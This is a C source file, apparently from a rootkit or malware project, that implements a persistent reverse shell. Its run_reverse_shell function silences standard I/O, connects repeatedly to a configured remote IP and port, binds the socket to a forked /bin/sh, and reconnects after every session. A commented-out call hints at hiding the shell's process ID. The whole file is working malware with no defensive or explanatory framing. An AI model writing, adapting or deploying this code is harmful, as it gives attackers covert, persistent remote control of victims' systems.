#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/wait.h>
#include "userspace/reverse_shell.h"
#include "userspace/hider.h"
#include "config.h"

void run_reverse_shell()
{
	if (chdir("/") < 0)
   		return;

	int nullfd = open("/dev/null", O_RDWR);
	if (nullfd >= 0) {
		dup2(nullfd, 0);
		dup2(nullfd, 1);
		dup2(nullfd, 2);
		if (nullfd > 2)
			close(nullfd);
	}

	while (1) {
		int sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock == -1) {
			sleep(RECONNECT_DELAY);
			continue;
		}

		struct sockaddr_in sa = {0};
		sa.sin_family = AF_INET;
		sa.sin_port = htons(REMOTE_PORT);
		sa.sin_addr.s_addr = inet_addr(REMOTE_IP);

		if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
			pid_t child = fork();
			if (child == 0) {
				/* Run shell with socket fds */
				dup2(sock, 0);
				dup2(sock, 1);
				dup2(sock, 2);
				if (sock > 2)
					close(sock);

				char *const argv[] = {"/bin/sh", NULL};
				execve("/bin/sh", argv, NULL);
				_exit(1); /* In case execve fails */
			} else if (child > 0) {
				/* Wait for child to exit then reconnect */
				// hider_hide_pid(child);
				printf("pid2: %d\n", child);
				waitpid(child, NULL, 0);
				close(sock);
			} else
				close(sock);
		} else
			close(sock);

		sleep(RECONNECT_DELAY);
	}
}
